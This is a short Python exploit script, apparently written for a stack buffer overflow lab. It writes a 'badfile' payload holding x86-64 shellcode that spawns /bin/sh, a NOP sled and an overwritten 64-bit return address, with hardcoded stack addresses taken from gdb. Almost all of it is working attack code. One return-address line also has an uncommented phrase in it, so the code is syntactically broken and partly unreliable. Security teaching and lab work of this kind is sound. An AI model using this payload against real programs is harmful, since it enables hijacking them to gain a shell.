#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
#Put the shellcode before the buffer because  strcpy() will terminate due to 64 bit leading zeroes. 
#Since we should start before the bufffer, &buffer is 0x7f,ff,ff,ffd890 adress in little endian format is actually stored as 90 d8 ff ff ff 7f. To start the exploit lets try starting at 90
start = 90   # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
#$rbp - &buffer = 208
ret =  0x7fffffffd890 + 160 account for data added by gdb 
offset = 208 + 8
L = 8     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)

